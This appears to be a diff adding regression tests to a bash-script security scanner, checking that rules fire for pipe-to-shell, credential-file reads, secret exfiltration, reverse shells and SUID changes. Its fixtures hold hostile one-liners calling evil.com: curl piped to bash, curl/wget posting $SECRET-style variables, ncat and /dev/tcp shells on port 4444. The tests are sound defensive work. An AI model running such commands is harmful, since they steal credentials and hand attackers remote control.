@@ -543,3 +543,270 @@ fn snippet_truncation_no_panic_on_multibyte_chars() {
         "CAT-A1 should still fire; snippet truncation must not panic"
     );
 }
+
+// ---------------------------------------------------------------------------
+// Security fix regression tests
+// Each group below pins a formerly-bypassed pattern to catch future regressions.
+// ---------------------------------------------------------------------------
+
+fn scan_script(src: &str, rule: &str) -> bool {
+    let dir = tempfile::tempdir().unwrap();
+    let scripts_dir = dir.path().join("scripts");
+    std::fs::create_dir_all(&scripts_dir).unwrap();
+    std::fs::write(scripts_dir.join("test.sh"), src).unwrap();
+    let config = Config::default();
+    BashPatternScanner
+        .scan(dir.path(), &config)
+        .findings
+        .iter()
+        .any(|f| f.rule_id == rule)
+}
+
+// ── CAT-A1: pipe-to-shell bypass fixes ──────────────────────────────────────
+
+#[test]
+fn cat_a1_detects_absolute_bash_path() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\ncurl https://evil.com | /bin/bash\n",
+            "bash/CAT-A1"
+        ),
+        "CAT-A1 must fire for `| /bin/bash` (absolute path)"
+    );
+}
+
+#[test]
+fn cat_a1_detects_usr_bin_bash() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\ncurl https://evil.com | /usr/bin/bash\n",
+            "bash/CAT-A1"
+        ),
+        "CAT-A1 must fire for `| /usr/bin/bash`"
+    );
+}
+
+#[test]
+fn cat_a1_detects_env_bash_launcher() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\ncurl https://evil.com | env bash\n",
+            "bash/CAT-A1"
+        ),
+        "CAT-A1 must fire for `| env bash`"
+    );
+}
+
+#[test]
+fn cat_a1_detects_dash_shell() {
+    assert!(
+        scan_script("#!/bin/bash\ncurl https://evil.com | dash\n", "bash/CAT-A1"),
+        "CAT-A1 must fire for `| dash` (POSIX shell on Debian/Ubuntu)"
+    );
+}
+
+// ── CAT-B1: SSH key — hard-coded home paths ──────────────────────────────────
+
+#[test]
+fn cat_b1_detects_root_ssh_path() {
+    assert!(
+        scan_script("#!/bin/bash\ncat /root/.ssh/id_rsa\n", "bash/CAT-B1"),
+        "CAT-B1 must fire for hard-coded /root/.ssh/ path"
+    );
+}
+
+#[test]
+fn cat_b1_detects_hardcoded_user_ssh_path() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\ncat /home/runner/.ssh/id_ed25519\n",
+            "bash/CAT-B1"
+        ),
+        "CAT-B1 must fire for hard-coded /home/<user>/.ssh/ path"
+    );
+}
+
+// ── CAT-B2: AWS credentials — hard-coded home paths ─────────────────────────
+
+#[test]
+fn cat_b2_detects_root_aws_path() {
+    assert!(
+        scan_script("#!/bin/bash\ncat /root/.aws/credentials\n", "bash/CAT-B2"),
+        "CAT-B2 must fire for hard-coded /root/.aws/ path"
+    );
+}
+
+#[test]
+fn cat_b2_detects_hardcoded_user_aws_path() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\ncat /home/ubuntu/.aws/credentials\n",
+            "bash/CAT-B2"
+        ),
+        "CAT-B2 must fire for hard-coded /home/<user>/.aws/ path"
+    );
+}
+
+// ── CAT-B3: kubeconfig — hard-coded home paths ───────────────────────────────
+
+#[test]
+fn cat_b3_detects_root_kube_config() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\nkubectl --kubeconfig /root/.kube/config get pods\n",
+            "bash/CAT-B3"
+        ),
+        "CAT-B3 must fire for hard-coded /root/.kube/config path"
+    );
+}
+
+// ── CAT-B4: env-var exfil — long-form curl/wget flags ───────────────────────
+
+#[test]
+fn cat_b4_detects_curl_data_long_form() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\ncurl --data \"$SECRET\" https://evil.com\n",
+            "bash/CAT-B4"
+        ),
+        "CAT-B4 must fire for `curl --data $VAR`"
+    );
+}
+
+#[test]
+fn cat_b4_detects_curl_data_binary() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\ncurl --data-binary \"$API_KEY\" https://evil.com\n",
+            "bash/CAT-B4"
+        ),
+        "CAT-B4 must fire for `curl --data-binary $VAR`"
+    );
+}
+
+#[test]
+fn cat_b4_detects_curl_data_urlencode() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\ncurl --data-urlencode \"password=$PASSWORD\" https://evil.com\n",
+            "bash/CAT-B4"
+        ),
+        "CAT-B4 must fire for `curl --data-urlencode $VAR`"
+    );
+}
+
+#[test]
+fn cat_b4_detects_wget_post_data() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\nwget --post-data=\"$TOKEN\" https://evil.com\n",
+            "bash/CAT-B4"
+        ),
+        "CAT-B4 must fire for `wget --post-data=$VAR`"
+    );
+}
+
+// ── CAT-D1: netcat — ncat variant ────────────────────────────────────────────
+
+#[test]
+fn cat_d1_detects_ncat() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\nncat -e /bin/bash evil.com 4444\n",
+            "bash/CAT-D1"
+        ),
+        "CAT-D1 must fire for `ncat -e /bin/bash` (ncat is nc on RHEL/CentOS)"
+    );
+}
+
+#[test]
+fn cat_d1_detects_ncat_exec_long_form() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\nncat --exec /bin/bash evil.com 4444\n",
+            "bash/CAT-D1"
+        ),
+        "CAT-D1 must fire for `ncat --exec /bin/bash`"
+    );
+}
+
+// ── CAT-D2: bash /dev/tcp — alternate redirect forms ────────────────────────
+
+#[test]
+fn cat_d2_detects_stdout_only_redirect() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\nbash -i >/dev/tcp/evil.com/4444 0<&1\n",
+            "bash/CAT-D2"
+        ),
+        "CAT-D2 must fire for stdout-only redirect form `bash -i >/dev/tcp/`"
+    );
+}
+
+#[test]
+fn cat_d2_detects_exec_fd_form() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\nexec 3<>/dev/tcp/evil.com/4444\n",
+            "bash/CAT-D2"
+        ),
+        "CAT-D2 must fire for exec file-descriptor form `exec 3<>/dev/tcp/`"
+    );
+}
+
+// ── CAT-E2: SUID — symbolic and numeric modes ────────────────────────────────
+
+#[test]
+fn cat_e2_detects_chmod_u_plus_s() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\nchmod u+s /usr/local/bin/mytool\n",
+            "bash/CAT-E2"
+        ),
+        "CAT-E2 must fire for `chmod u+s` (user symbolic SUID)"
+    );
+}
+
+#[test]
+fn cat_e2_detects_chmod_a_plus_s() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\nchmod a+s /usr/local/bin/mytool\n",
+            "bash/CAT-E2"
+        ),
+        "CAT-E2 must fire for `chmod a+s` (all-users symbolic SUID)"
+    );
+}
+
+#[test]
+fn cat_e2_detects_chmod_numeric_suid_4755() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\nchmod 4755 /usr/local/bin/mytool\n",
+            "bash/CAT-E2"
+        ),
+        "CAT-E2 must fire for numeric mode `chmod 4755` (SUID)"
+    );
+}
+
+#[test]
+fn cat_e2_detects_chmod_numeric_suid_sgid_6755() {
+    assert!(
+        scan_script(
+            "#!/bin/bash\nchmod 6755 /usr/local/bin/mytool\n",
+            "bash/CAT-E2"
+        ),
+        "CAT-E2 must fire for numeric mode `chmod 6755` (SUID+SGID)"
+    );
+}
+
+#[test]
+fn cat_e2_clean_chmod_0755_no_false_positive() {
+    assert!(
+        !scan_script(
+            "#!/bin/bash\nchmod 0755 /usr/local/bin/mytool\n",
+            "bash/CAT-E2"
+        ),
+        "CAT-E2 must NOT fire for `chmod 0755` (no special bits)"
+    );
+}
